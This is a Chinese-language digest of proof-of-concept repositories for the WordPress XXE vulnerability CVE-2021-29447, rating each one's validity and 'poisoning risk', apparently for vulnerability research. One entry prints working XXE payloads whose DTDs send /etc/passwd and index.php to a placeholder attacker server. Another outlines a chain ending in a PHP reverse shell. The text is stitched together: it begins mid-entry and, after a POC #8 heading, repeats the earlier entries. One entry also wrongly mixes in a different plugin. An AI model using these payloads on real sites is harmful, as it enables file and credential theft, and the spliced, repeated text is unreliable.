代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
4.  当WordPress解析该WAV文件时，会触发XXE漏洞，导致服务器加载并执行恶意DTD文件中的指令，将目标服务器上的文件内容通过HTTP请求发送给攻击者。

**有效性评估：**

根据漏洞信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码（`evil-wav-dtd-xxe.py`）可以生成恶意的WAV文件和DTD文件，用于利用该漏洞读取服务器上的敏感文件。因此，PoC代码是有效的。

**投毒风险评估：**

查看提供的PoC代码，该代码主要用于生成漏洞利用所需的WAV和DTD文件。 `evil-wav-dtd-xxe.py` 脚本本身的作用就是生成利用漏洞的payload， 从代码逻辑上看，不存在明显的恶意代码或后门。`readme.md` 仅仅是提供使用的说明。

**利用方式总结：**

1.  **权限要求：** 具有上传文件权限的WordPress用户（如Author角色）。
2.  **环境要求：** WordPress版本在5.6.0到5.7.1之间，运行在PHP 8环境下。
3.  **攻击步骤：**
    *   准备恶意DTD文件：该文件定义了读取服务器文件的实体，并将文件内容发送到攻击者控制的服务器。
    *   生成恶意WAV文件：使用`evil-wav-dtd-xxe.py`脚本生成包含指向恶意DTD文件的XML的WAV文件。
    *   上传恶意WAV文件：通过WordPress媒体库上传生成的WAV文件。
    *   触发XXE漏洞：WordPress解析WAV文件时，加载恶意DTD文件，读取服务器文件并通过HTTP请求发送给攻击者。


**项目地址:** [G01d3nW01f/CVE-2021-29447](https://github.com/G01d3nW01f/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #7

**来源**: [CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md](../2021/CVE-2021-29447-M3l0nPan_wordpress-cve-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1，运行在PHP 8环境下

**利用条件:** 需要拥有上传文件权限（例如，作者权限），并且服务器运行在PHP 8环境下

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于WordPress的媒体库中，允许具有上传文件权限的用户通过上传包含恶意XML的音频文件（如WAV或MP3）来触发XXE漏洞。此漏洞要求WordPress运行在PHP 8环境下，因为该版本的PHP中使用的XML解析器存在缺陷。攻击者可以利用此漏洞读取服务器上的敏感文件。PoC利用了本地启动HTTP服务的方式来接收目标服务器发送的文件内容，相对安全。投毒风险极低，主要风险点在脚本第一行的`#!/usr/bin/dev python3`，存在一定的误导性，如果用户直接复制该代码，可能会导致执行失败，但对安全性没有影响。主要功能代码位于`wordpress-cve-2021-29447.py`文件中，实现了漏洞利用的全部流程，包括身份验证、恶意文件上传和文件读取。

**项目地址:** [M3l0nPan/wordpress-cve-2021-29447](https://github.com/M3l0nPan/wordpress-cve-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #8

**来源**: [CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md](../2021/CVE-2021-29447-Tea-On_CVE-2021-29447-Authenticated-XXE-WordPress-5.6-5.7.md)

# CVE-2021-29447

> 📦 该CVE有 **19** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md](../2021/CVE-2021-29447-0xRar_CVE-2021-29447-PoC.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露，服务器端请求伪造 (SSRF)

**影响版本:** 5.6.0 <= version < 5.7.1 (需要PHP 8环境)

**利用条件:** 需要 WordPress 站点运行在 PHP 8 环境，并具有文件上传权限（例如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-29447 是一个 WordPress 的 XXE 漏洞，存在于 5.6 到 5.7 版本中，且需要运行在 PHP 8 环境下。攻击者需要具备文件上传权限，比如拥有 Author 角色。漏洞原理是 WordPress 在处理上传的媒体文件时，特别是 WAVE 音频文件，其中使用的 ID3 解析库存在 XML 解析问题。攻击者可以构造恶意的 WAVE 文件，其中包含指向外部实体的 XML 代码，从而读取服务器上的任意文件，或进行服务器端请求伪造。

**利用方式:**

1.  攻击者首先需要一个具有文件上传权限的 WordPress 账户（如 Author）。
2.  攻击者构造一个包含恶意 XML 内容的 WAVE 文件（payload.wav）。该 XML 声明了一个外部实体，指向攻击者控制的服务器上的 DTD 文件。
3.  攻击者在自己的服务器上部署一个恶意的 DTD 文件（evil.dtd）。该 DTD 文件定义了另一个实体，用于读取目标服务器上的文件内容，并通过 HTTP 请求将内容发送给攻击者。
4.  攻击者将构造的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  当 WordPress 解析该 WAVE 文件时，会触发 XXE 漏洞，加载攻击者服务器上的 DTD 文件，并读取目标文件内容，将 base64 编码后的内容发送到攻击者的服务器。
6.  攻击者从 HTTP 请求中获取 base64 编码的数据，并进行解码，得到目标文件的内容。

**POC 代码分析:**

提供的 Python 脚本 `PoC.py` 用于自动化生成恶意的 `payload.wav` 和 `evil.dtd` 文件。该脚本需要指定攻击者的服务器 IP 地址、端口，以及要读取的目标文件路径。脚本还会启动一个简单的 PHP HTTP 服务器，用于接收目标服务器发送的请求。

**投毒风险评估:**

代码本身功能明确，就是用于生成payload和启动http server，没有发现任何隐藏的恶意代码或后门。decode.php只是用来解码base64数据，所以判定没有投毒风险。

**项目地址:** [0xRar/CVE-2021-29447-PoC](https://github.com/0xRar/CVE-2021-29447-PoC)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #2

**来源**: [CVE-2021-29447-0xricksanchez_CVE-2021-29447.md](../2021/CVE-2021-29447-0xricksanchez_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress Authenticated XXE attack in Media Library

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML External Entity (XXE) Injection

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露

**影响版本:** >= 5.6.0, < 5.7.1 (需要 PHP 8)

**利用条件:** 需要具有文件上传权限（例如，作者角色），且WordPress运行在PHP 8环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 5.6.0 到 5.7.1 版本之间，允许具有文件上传权限的用户（例如作者）通过媒体库上传包含恶意 XML 内容的文件，从而触发 XXE 攻击。漏洞利用依赖于 WordPress 使用 PHP 8，因为 PHP 8 对 XML 解析的处理方式使得 XXE 攻击成为可能。

**有效性：**
提供的 POC 代码 `expl.py` 针对的是利用 WAV 文件中的 iXML 块进行 XXE 注入。这个POC专门针对 WordPress BookingPress 插件 < 1.0.11，但该漏洞的描述是通用的，只要目标应用解析包含恶意 XML 的 iXML 块，就可能受到攻击。由于CVE-2021-29447描述的场景和POC有一定关联，判断该POC具有一定的有效性，可以尝试在受影响的 WordPress 版本上利用。

**投毒风险：**
代码中存在投毒的风险较低。`expl.py` 脚本的主要功能是生成包含 XXE payload 的恶意 WAV 文件。Payload 从命令行参数获取IP和端口，攻击者需要配置自己的HTTP服务来接收数据。`README.md` 中也描述了整个利用流程，从生成恶意文件到启动 HTTP 服务器再到解码数据。但是如果攻击者没有配置自己的服务器，可能会导致数据泄露到poc作者搭建的服务器。因此推断存在10%的投毒风险。

**利用方式：**
1.  **生成恶意 WAV 文件：** 运行 `expl.py` 脚本，指定攻击者控制的服务器 IP 地址和端口，生成包含 XXE payload 的 `exploit.wav` 文件。
2.  **启动 HTTP 服务器：** 在攻击者服务器上启动一个 HTTP 服务器，用于提供外部实体定义 (DTD)。
3.  **上传恶意文件：** 具有文件上传权限的 WordPress 用户将 `exploit.wav` 文件上传到媒体库。
4.  **触发 XXE：** WordPress 解析上传的 WAV 文件，当解析 iXML 块时，会尝试从攻击者控制的服务器下载 DTD 文件，从而触发 XXE 攻击，导致服务器上的文件被读取并以 Base64 编码的形式发送到攻击者的服务器。
5.  **解码数据：** 攻击者从 HTTP 服务器的日志中获取 Base64 编码的数据，并进行解码，获取被读取的文件内容。

**项目地址:** [0xricksanchez/CVE-2021-29447](https://github.com/0xricksanchez/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #3

**来源**: [CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md](../2021/CVE-2021-29447-Abdulazizalsewedy_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (requires PHP 8)

**利用条件:** 需要 WordPress 运行在 PHP 8 环境，且攻击者需要具备上传文件的权限（如 Author 角色）

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-29447 是一个存在于 WordPress 5.6.0 到 5.7.1 版本的 XXE 漏洞。该漏洞允许具有上传文件权限的用户（例如，作者）通过上传包含恶意 XML 内容的文件（如特制的 WAVE 文件）来执行 XXE 攻击。

**有效性分析：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。漏洞库信息、搜索引擎结果和 POC 代码的 README.md 文件均描述了该漏洞的利用方式和影响。

**投毒风险分析：**
提供的漏洞利用代码（README.md）主要描述了漏洞的原理、利用方法和修复方案，并未发现明显的恶意代码或后门。其核心步骤包括：

1.  创建一个包含恶意 XML 内容的 WAVE 文件。
2.  搭建一个 HTTP 服务器，用于接收 XXE 攻击泄露的数据。
3.  将恶意 WAVE 文件上传到 WordPress 的媒体库。
4.  从 HTTP 服务器的日志中获取泄露的敏感信息（例如，wp-config.php 中的数据库凭据）。

虽然代码本身没有直接的投毒行为，但攻击者可能利用泄露的数据库凭据进一步入侵系统。因此，投毒风险较低，估计为 5%。

**利用方式分析：**
该漏洞的利用方式主要分为以下几个步骤：

1.  **权限获取：** 攻击者需要具备 WordPress 中上传文件的权限（如 Author 角色）。
2.  **恶意文件制作：** 攻击者需要构造一个恶意的 WAVE 文件，该文件包含指向外部实体的 XML 内容，用于触发 XXE 漏洞。DTD文件包含需要泄露的文件路径，例如 wp-config.php。
3.  **HTTP服务器搭建：** 攻击者需要搭建一个 HTTP 服务器，用于接收来自 WordPress 服务器的请求，这些请求包含通过 XXE 漏洞泄露的敏感信息。Zlib解码用于有效的提取数据
4.  **文件上传：** 攻击者将制作好的恶意 WAVE 文件上传到 WordPress 的媒体库。
5.  **信息泄露：** 当 WordPress 解析上传的 WAVE 文件时，会触发 XXE 漏洞，导致服务器向攻击者的 HTTP 服务器发送包含敏感信息的请求。
6.  **数据提取：** 攻击者从 HTTP 服务器的日志中提取泄露的敏感信息，例如 wp-config.php 文件中的数据库凭据。
7.  **后续利用：** 攻击者可以利用泄露的数据库凭据登录数据库，并进一步获取管理员权限，甚至控制整个 WordPress 网站。

**项目地址:** [Abdulazizalsewedy/CVE-2021-29447](https://github.com/Abdulazizalsewedy/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #4

**来源**: [CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md](../2021/CVE-2021-29447-ArtemCyberLab_Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-.md)

## CVE-2021-29447 WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露，包括数据库凭据，并最终导致远程代码执行

**影响版本:** >= 5.6.0, < 5.7.1，需要PHP 8

**利用条件:** 需要具备上传文件的权限 (如 Author 角色)，服务器运行PHP 8，存在可利用的端口（如80,443,22,3306）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

提供的漏洞利用代码展示了完整的攻击链，从信息收集到获取反向shell。漏洞CVE-2021-29447是WordPress媒体库中的XXE漏洞，该漏洞允许攻击者通过上传特制的恶意WAV文件读取服务器上的敏感文件，比如wp-config.php。漏洞利用过程如下：

1. **侦察和枚举：** 使用Nmap扫描目标主机，发现开放端口和服务版本。使用WPScan枚举用户名，并通过暴力破解获取有效凭据。
2. **XXE 漏洞利用：**  构造包含恶意XML内容的WAV文件，利用XML外部实体注入读取wp-config.php文件。需要搭建一个HTTP服务器来接收和处理泄露的数据。使用php脚本解码base64编码的数据，提取数据库凭据。
3. **数据库访问：** 使用获得的数据库凭据连接到MySQL数据库，提取用户表中的用户名和密码哈希。
4. **密码破解：** 使用John the Ripper破解用户密码哈希，获取明文密码。
5. **权限提升和远程代码执行：** 修改Hello Dolly插件，插入PHP反向shell代码。通过访问修改后的插件页面，触发反向shell连接到攻击者控制的机器。
6. **后渗透：**  在获取shell后，执行提权操作，查找敏感文件。

**关于投毒风险的分析:**

POC代码中包含完整的攻击链，本身并没有明显的投毒代码，但如果使用者不熟悉整个流程，直接复制粘贴执行，可能会留下后门，例如植入的PHP反向shell。此外，攻击者可能将接收泄露数据的 HTTP server  替换成一个恶意站点，窃取攻击者的信息。因此，判定存在一定概率的投毒风险，估计为10%。主要风险点在于使用者对代码理解程度不够，可能直接使用未经验证的代码。


**项目地址:** [ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-](https://github.com/ArtemCyberLab/Project-Project-Chimera-Exploiting-a-Modern-WordPress-XXE-to-Pillage-Secrets-)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #5

**来源**: [CVE-2021-29447-AssassinUKG_CVE-2021-29447.md](../2021/CVE-2021-29447-AssassinUKG_CVE-2021-29447.md)

## CVE-2021-29447 - WordPress XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XML 外部实体注入 (XXE)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感信息泄露和服务器端请求伪造 (SSRF)

**影响版本:** >= 5.6.0, < 5.7.1 (在 PHP 8 环境下)

**利用条件:** 需要具备上传文件的权限 (如作者角色)，且服务器运行在 PHP 8 环境下。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-29447 漏洞存在于 WordPress 的媒体库中，当 WordPress 运行在 PHP 8 环境下时，具有上传文件权限的用户（例如作者）可以通过上传包含恶意 XML 内容的文件（如特制的 WAV 文件）来触发 XXE 漏洞。

**利用方式：**

1.  **构建恶意 WAV 文件：** 攻击者需要创建一个包含恶意 XML 声明的 WAV 文件。该 XML 声明包含一个外部实体引用，指向攻击者控制的远程 DTD 文件。

    ```xml
    <?xml version="1.0"?>
    <!DOCTYPE ANY[
        <!ENTITY % remote SYSTEM 'http://YOURSEVERIP:PORT/NAMEEVIL.dtd'>
        %remote;%init;%trick;
    ]>
    ```

2.  **创建恶意 DTD 文件：** 攻击者需要在自己的服务器上创建一个 DTD 文件，该文件定义了如何读取服务器上的文件，并将其发送回攻击者。例如，读取 `/etc/passwd` 文件并进行 Base64 编码。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

    或者，读取 WordPress 配置文件 `index.php`。

    ```xml
    <!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=../index.php">
    <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://YOURSERVERIP:PORT/?p=%file;'>" >
    ```

3.  **上传恶意 WAV 文件：** 攻击者通过 WordPress 后台的媒体库上传该恶意 WAV 文件。

4.  **触发 XXE：** WordPress 解析该 WAV 文件时，会尝试解析其中的 XML 内容，从而触发 XXE 漏洞，并从攻击者的服务器下载 DTD 文件。

5.  **获取文件内容：** 恶意 DTD 文件会指示 WordPress 读取目标文件（例如 `/etc/passwd` 或 `wp-config.php`），对其进行 Base64 编码，并通过 HTTP 请求将内容发送到攻击者的服务器。

**有效性：**

提供的 POC 代码有效，可以利用该漏洞读取服务器上的文件，或者进行 SSRF 攻击。搜索结果中的多个链接也证实了该漏洞的存在以及利用方式。

**投毒风险：**

代码中存在轻微的投毒风险。主要的风险点在于 DTD 文件是由攻击者提供的。虽然提供的 DTD 示例代码是用来读取文件，但攻击者可以在 DTD 文件中执行其他恶意操作，例如尝试执行代码。但是由于文件读取已经是该漏洞所能达到的最大危害之一。所以判断投毒风险为10%。该值评估仓库中是否隐藏有恶意或非预期行为的代码。例如，某些代码可能会在未经授权的情况下收集用户信息、安装后门或执行其他恶意活动。 

**项目地址:** [AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)

**漏洞详情:** [CVE-2021-29447](https://nvd.nist.gov/vuln/detail/CVE-2021-29447)

---

## POC #6

**来源**: [CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md](../2021/CVE-2021-29447-G01d3nW01f_CVE-2021-29447.md)

## CVE-2021-29447-WordPress-XXE

**漏洞编号:** CVE-2021-29447

**漏洞类型:** XXE (XML External Entity)

**影响应用:** WordPress

**危害等级:** 高危，可能导致敏感文件泄露

**影响版本:** >= 5.6.0, < 5.7.1 (PHP 8)

**利用条件:** 需要WordPress版本在5.6.0到5.7.1之间，并且运行在PHP 8环境下；需要具备上传文件的权限（如Author角色）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于WordPress媒体库中，允许具有文件上传权限的用户利用XML解析漏洞执行XXE攻击。漏洞利用需要WordPress运行在PHP 8环境下，因为该漏洞利用了PHP 8中ID3库的一个缺陷。攻击者可以上传包含恶意XML代码的WAV文件，其中XML代码定义了外部实体，导致服务器尝试解析并加载外部资源。利用方式如下：

1.  攻击者准备一个恶意的DTD文件，该文件包含用于读取服务器文件或执行其他操作的实体。
2.  攻击者使用提供的Python脚本 (`evil-wav-dtd-xxe.py`) 生成一个包含指向恶意DTD的XML的WAV文件。 该脚本会创建一个DTD文件，其中包含一个实体来读取目标文件，并创建一个HTTP请求来将读取的文件内容发送到攻击者的服务器。
3.  攻击者通过WordPress媒体库上传生成的恶意WAV文件。
